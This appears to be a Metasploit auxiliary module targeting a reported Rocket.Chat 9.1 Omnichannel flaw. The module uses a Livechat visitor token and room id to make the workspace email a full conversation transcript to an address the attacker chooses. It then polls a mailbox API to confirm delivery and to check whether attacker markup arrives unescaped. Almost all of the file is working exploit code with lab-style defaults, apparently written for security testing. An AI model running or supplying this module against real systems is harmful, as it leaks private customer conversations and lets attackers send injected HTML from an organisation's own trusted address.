class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat 9.1 Livechat transcript relayed to any address (VULN-051)',
        'Description' => %q{
          Rocket.Chat's Omnichannel transcript route is anonymous, authorised only by
          the visitor token the chat widget holds, and it mails the whole conversation
          to whatever address the caller supplies, from the workspace's own address.
          An upload's description is interpolated into that mail without escaping, so
          a visitor's markup travels live in mail from the organisation. This module
          requests the transcript of the conversation the operator names, sent to the
          address the operator names, then reads the mailbox and reports the mail that
          arrived and whether the markup stayed live. The operator supplies the
          visitor token, the room id, the recipient and the mailbox.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/livechat/transcript']),
      OptString.new('MAILHOST', [true, 'Host of the operator\'s mailbox API (Mailpit or MailHog shape)', 'mailpit']),
      OptString.new('MAILPORT', [true, 'Port of that mailbox API', '8025']),
      OptString.new('VISITORTOKEN', [true, 'The Livechat visitor token of the conversation to relay', 'cust-b1-8aff13']),
      OptString.new('ROOMID', [true, 'That conversation\'s room id', 'uBCF3TbEtTG4xqRTM']),
      OptString.new('RECIPIENT', [true, 'The address the workspace is made to mail the transcript to', 'victim@lab.invalid']),
      OptString.new('MARKUP', [true, 'Markup already present in the conversation to look for in the mail; leave empty to check only that the relay happened', ''])
    ])
  end

  def run
    res = request_transcript
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = parse_json(res)['success'] == true && transcript_arrived?
    fail_with(Failure::NotVulnerable, 'VULN-051: the attack did not land') unless hit

    print_good("#{peer} - VULN-051: exploited")
    print_good("#{peer} - the workspace mailed the conversation to "\
               "#{datastore['RECIPIENT']} from #{@mail_from}, subject "\
               "#{@mail_subject[0, 90].inspect} (markup escaped="\
               "#{@mail_escaped})")
    path = store_loot('blue_spider.vuln_051', 'text/plain', rhost, res.body.to_s, 'vuln_051.txt', 'VULN-051 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-051 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  # The workspace's own outbound mail is where this finding lands, so the
  # module reads the mailbox the operator names. That is a different host from
  # RHOST, so it goes through a client of its own rather than the HttpClient
  # mixin. Nothing is sent or deleted: the mailbox is only read.
  def mail_get(path)
    cli = Rex::Proto::Http::Client.new(datastore['MAILHOST'], datastore['MAILPORT'].to_i)
    cli.connect(10)
    res = cli.send_recv(cli.request_cgi('method' => 'GET', 'uri' => path), 20)
    cli.close
    res
  rescue StandardError => e
    vprint_error("#{peer} - could not read the mailbox at " \
                 "#{datastore['MAILHOST']}:#{datastore['MAILPORT']}: #{e}")
    nil
  end

  def mail_list(limit = 50)
    res = mail_get("/api/v1/messages?limit=#{limit}")
    return [] unless res

    doc = JSON.parse(res.body.to_s)
    doc['messages'] || doc['items'] || []
  rescue StandardError
    []
  end

  def mail_body(id)
    res = mail_get("/api/v1/message/#{id}")
    return '' unless res

    doc = JSON.parse(res.body.to_s)
    [doc['Subject'], doc['HTML'], doc['Text']].compact.join("\n")
  rescue StandardError
    res ? res.body.to_s : ''
  end

  # The mail that proves it: sent by the workspace itself, carrying text the
  # attacker chose, and carrying it live rather than escaped.
  def workspace_mail_carrying(marker, recipient = '', tries = 6)
    tries.times do |n|
      mail_list.each do |m|
        next unless recipient.empty? || m.to_s.include?(recipient)

        body = mail_body(m['ID'] || m['Id'] || m['id'])
        next unless body.include?(marker)

        @mail_subject = m['Subject'].to_s
        @mail_from = (m.dig('From', 'Address') || m['From']).to_s
        @mail_escaped = body.include?(escaped(marker))
        vprint_status("#{peer} - mail #{(m['ID'] || '').to_s[0, 12]} from " \
                      "#{@mail_from}: #{@mail_subject[0, 70].inspect}")
        return true
      end
      sleep(2) unless n == tries - 1
    end
    false
  end

  def escaped(marker)
    marker.gsub('&', '&amp;').gsub('<', '&lt;').gsub('>', '&gt;')
  end

  def request_transcript
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/json',
      'data' => { 'token' => datastore['VISITORTOKEN'],
                  'rid' => datastore['ROOMID'],
                  'email' => datastore['RECIPIENT'] }.to_json
    })
  end

  # The relay itself is the finding: an anonymous holder of a visitor token
  # makes the workspace mail a whole conversation, from its own address, to an
  # address of the caller's choosing. MARKUP, when the operator sets it, adds
  # the second half: that the conversation's own HTML travels live.
  def transcript_arrived?
    marker = datastore['MARKUP'].to_s
    marker = 'ranscript' if marker.empty?
    return false unless workspace_mail_carrying(marker, datastore['RECIPIENT'])

    datastore['MARKUP'].to_s.empty? || !@mail_escaped
  end
end
